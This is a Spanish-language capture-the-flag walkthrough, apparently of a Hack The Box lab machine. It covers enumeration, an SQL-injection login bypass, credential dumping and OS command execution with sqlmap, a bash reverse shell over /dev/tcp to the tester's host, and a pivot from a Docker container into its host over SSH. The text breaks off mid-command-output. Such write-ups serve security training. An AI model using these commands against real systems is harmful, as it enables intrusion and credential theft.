+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.96.171
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up (0.035s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1499</span> open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>26994/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 1.04 seconds</span></span></code></pre></div>
+<h1 id="ftp-enumeration">FTP Enumeration</h1>
+<p>Encontramos un instalador de docker.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Este instalador nos da una pista de que quizás existan contenedores por detrás.</p>
+<p>Me interesa saber la versión para buscar vulnerabilidades asociadas, para ello podemos calcular el hash MD5.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>md5sum docker-toolbox.exe 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>c5312c5b4b4df67a0628c3df8929f1f8  docker-toolbox.exe</span></span></code></pre></div>
+<p>Y podemos buscar este hash en VirusTotal para revelar la versión del instalador.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>No encontré nada asociado.</p>
+<h1 id="https-enumeration">HTTPS Enumeration</h1>
+<p>Con el escaneo inicial encontramos el dominio <code>megalogistic.com</code> y el subdominio <code>admin.megalogistic.com</code>, agregamos esta información al <code>/etc/hosts</code></p>
+<p>Podemos inspeccionar el certificado TLS.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>openssl s_client -showcerts -connect 10.129.96.171:443</span></span></code></pre></div>
+<p>Encontramos un correo <code>admin@megalogistic.com</code></p>
+<h2 id="megalogisticcom">megalogistic.com</h2>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>whatweb https://megalogistic.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>https://megalogistic.com [<span style="color:#ff0;font-weight:bold">200</span> OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.129.96.171], JQuery[3.3.1], Script, Title[MegaLogistics]</span></span></code></pre></div>
+<p>No nos reporta nada interesante <code>whatweb</code></p>
+<p>El sitio web se ve así, muy estático y sin nada relevante.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<h2 id="adminmegalogisticcom---sql-injection">admin.megalogistic.com -&gt; SQL Injection</h2>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>whatweb https://admin.megalogistic.com/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>https://admin.megalogistic.com/ [<span style="color:#ff0;font-weight:bold">200</span> OK] Apache[2.4.38], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.129.96.171], PHP[7.3.14], PasswordField[password], Title[Administrator Login], X-Powered-By[PHP/7.3.14]</span></span></code></pre></div>
+<p>Lo único relevante que <code>whatweb</code> nos reporta es que se utiliza PHP por detrás.</p>
+<p>El sitio se ve así, un panel de inicio de sesión.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Si ponemos una <code>'</code>
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Con una simple inyección SQL podernos saltarnos el panel de autenticación.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Vemos la nota en el panel de administración</p>
+<ul>
+<li>Send credentials to Tony</li>
+<li>Update Printer Drivers</li>
+</ul>
+<p>Esto nos podría servir mas adelante.</p>
+<p>Encontramos un panel con correos electrónicos, no se si me servirán para mas add</p>
+<p><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Podemos copiar todo y solo quedarnos con los correos</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>cat users.txt | grep @ | sponge users.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/toolbox/content]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>└──╼ [★]$ cat users.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>builders@megacorp.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>info@pix.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>orders@drapes.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>drake@sounds.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>track@accord.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>makers@blocks.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>evy@royal.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>delivery@game.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>info@vroom.com</span></span></code></pre></div>
+<p>Después de enumerar un rato el panel (tampoco hay mucho) no encontré nada, así que vamos a probar a abusar de la SQLi a ver si encontramos mas información relevante.</p>
+<h1 id="abusing-sql-injection">Abusing SQL Injection</h1>
+<p>Podemos utilizar <code>sqlmap</code> para abusar de esta inyección.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sqlmap -u https://admin.megalogistic.com/ --data=<span style="color:#0ff;font-weight:bold">&#34;username=*&amp;password=blablalba&#34;</span> --level <span style="color:#ff0;font-weight:bold">5</span> --risk <span style="color:#ff0;font-weight:bold">3</span> --batch --dbs
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>available databases [3]:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[*] information_schema
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[*] pg_catalog
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[*] public</span></span></code></pre></div>
+<p>La base de datos <code>public</code> contiene una tabla <code>users</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sqlmap -u https://admin.megalogistic.com/ --data=<span style="color:#0ff;font-weight:bold">&#34;username=*&amp;password=blablalba&#34;</span> --level <span style="color:#ff0;font-weight:bold">5</span> --risk <span style="color:#ff0;font-weight:bold">3</span> --batch -D public --tables
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>.....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Database: public
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[<span style="color:#ff0;font-weight:bold">1</span> table]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>+-------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>| users |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>+-------+</span></span></code></pre></div>
+<p>Vemos un hash MD5 del usuario <code>admin</code> pero no conseguí crackearlo ni con <code>john</code> ni con <code>hashcat</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sqlmap -u https://admin.megalogistic.com/ --data=<span style="color:#0ff;font-weight:bold">&#34;username=*&amp;password=blablalba&#34;</span> --level <span style="color:#ff0;font-weight:bold">5</span> --risk <span style="color:#ff0;font-weight:bold">3</span> --batch -D public -T users --dump
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>.....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>+----------------------------------+----------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>| password                         | username |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>+----------------------------------+----------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>| 4a100a85cb5ca3616dcf137918550815 | admin    |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>+----------------------------------+----------+</span></span></code></pre></div>
+<h2 id="command-execution-through-sql-injection---foothold">Command Execution through SQL Injection -&gt; Foothold</h2>
+<p>Inocentemente probé con el parámetro <code>--os-shell</code> que intenta ejecutar código en el sistema.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sqlmap -u https://admin.megalogistic.com/ --data=<span style="color:#0ff;font-weight:bold">&#34;username=*&amp;password=blablalba&#34;</span> --level <span style="color:#ff0;font-weight:bold">5</span> --risk <span style="color:#ff0;font-weight:bold">3</span> --os-shell --batch
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>os-shell&gt; whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#fff;font-weight:bold">do</span> you want to retrieve the <span style="color:#fff;font-weight:bold">command</span> standard output? [Y/n/a] Y
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[23:00:52] [INFO] retrieved: <span style="color:#0ff;font-weight:bold">&#39;postgres&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#fff;font-weight:bold">command</span> standard output: <span style="color:#0ff;font-weight:bold">&#39;postgres&#39;</span></span></span></code></pre></div>
+<p>Y vemos que conseguimos ejecución de comandos</p>
+<p>Nos mandamos una revshell para trabajar mas cómodamente</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>os-shell&gt; bash -c <span style="color:#0ff;font-weight:bold">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.76/443 0&gt;&amp;1&#34;</span></span></span></code></pre></div>
+<p><img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Detectamos que estamos en un contenedor.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ip a
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bash: ip: <span style="color:#fff;font-weight:bold">command</span> not found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ hostname -I
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>172.17.0.2</span></span></code></pre></div>
+<p>Como es una máquina fácil, fui a lo obvio e intente recuperar las credenciales de acceso a la base de datos por si se reutilizan estas credenciales.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$conn = pg_connect(<span style="color:#0ff;font-weight:bold">&#34;host=localhost port=5432 dbname=test user=postgres password=password&#34;</span>);</span></span></code></pre></div>
+<p>Pero no tiene pinta&hellip;</p>
+<p>Por la cara me encontré la flag de usuario</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>f0183e44378ea... flag.txt</span></span></code></pre></div>
+<h2 id="container-pivoting">Container Pivoting</h2>
+<p>Este contenedor no tenía <code>ping</code> instalado
+Así que probando si conseguía detectar si algún estaba abierto en la dirección <code>172.17.0.1</code> que suele ser la máquina anfitriona..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql$ ping 172.17.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bash: ping: <span style="color:#fff;font-weight:bold">command</span> not found</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span> &gt; /dev/tcp/172.17.0.1/5985 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bash: connect: Connection refused
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>bash: /dev/tcp/172.17.0.1/5985: Connection refused
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span> &gt; /dev/tcp/172.17.0.1/49664
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>bash: connect: Connection refused
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>bash: /dev/tcp/172.17.0.1/49664: Connection refused
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span> &gt; /dev/tcp/172.17.0.1/22</span></span></code></pre></div>
+<p>Detecté que el puerto 22 está abierto.</p>
+<p>Al buscar <code>Docker Toolbox SSH</code> me encontré <a href="https://stackoverflow.com/questions/32027403/docker-toolbox-ssh-login">este post en StackOverFlow</a></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>(remote) postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>docker@172.17.0.1<span style="color:#0ff;font-weight:bold">&#39;s password: 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#0ff;font-weight:bold">   ( &#39;</span>&gt;<span style="color:#f00">&#39;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>  /) TC (<span style="color:#0ff;font-weight:bold">\ </span>  Core is distributed with ABSOLUTELY NO WARRANTY.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span> (/-_--_-<span style="color:#0ff;font-weight:bold">\)</span>           www.tinycorelinux.net
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>docker@box:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>docker@box:~$ ip a                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">1500</span> qdisc pfifo_fast state UP group default qlen <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    link/ether 08:00:27:f2:5e:be brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>    inet6 fe80::a00:27ff:fef2:5ebe/64 scope link 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">1500</span> qdisc pfifo_fast state UP group default qlen <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>    link/ether 08:00:27:2c:6d:87 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>    inet 192.168.99.100/24 brd 192.168.99.255 scope global eth1
